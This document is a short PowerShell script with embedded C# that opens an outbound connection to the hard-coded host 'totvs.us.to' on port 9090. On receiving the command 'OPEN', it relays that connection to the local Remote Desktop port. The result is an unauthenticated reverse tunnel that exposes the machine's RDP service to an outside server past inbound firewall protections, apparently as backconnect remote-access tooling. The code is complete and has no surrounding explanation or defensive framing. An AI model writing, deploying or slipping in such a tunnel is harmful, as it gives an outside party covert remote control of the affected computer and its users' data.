$Server="totvs.us.to"


Add-Type @"
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;



public class TunnelClient
{


static async Task Pipe(NetworkStream a, NetworkStream b)
{

byte[] buffer = new byte[65536];


try
{

while(true)
{

int n =
await a.ReadAsync(buffer,0,buffer.Length);



if(n <= 0)
break;



await b.WriteAsync(buffer,0,n);


}


}
catch
{

}



try {a.Close();}catch{}
try {b.Close();}catch{}


}



static async Task Relay(NetworkStream a, NetworkStream b)
{

await Task.WhenAny(

Pipe(a,b),

Pipe(b,a)

);


}



public static async Task Start(string host)
{


TcpClient tunnel =
new TcpClient();



Console.WriteLine("[*] Conectando servidor");



await tunnel.ConnectAsync(host,9090);



Console.WriteLine("[+] Tunel conectado");



NetworkStream tunnelStream =
tunnel.GetStream();



byte[] buffer =
new byte[1024];



int read =
await tunnelStream.ReadAsync(buffer,0,buffer.Length);



string cmd =
Encoding.ASCII.GetString(buffer,0,read);



Console.WriteLine("[+] Control: "+cmd);



if(cmd.Trim()=="OPEN")
{


TcpClient rdp =
new TcpClient();



Console.WriteLine("[+] Abriendo RDP Local");



await rdp.ConnectAsync("127.0.0.4",3389);



Console.WriteLine("[+] RDP conectado");



NetworkStream rdpStream =
rdp.GetStream();



await Relay(tunnelStream,rdpStream);



}


}

}
"@



[TunnelClient]::Start($Server).GetAwaiter().GetResult()
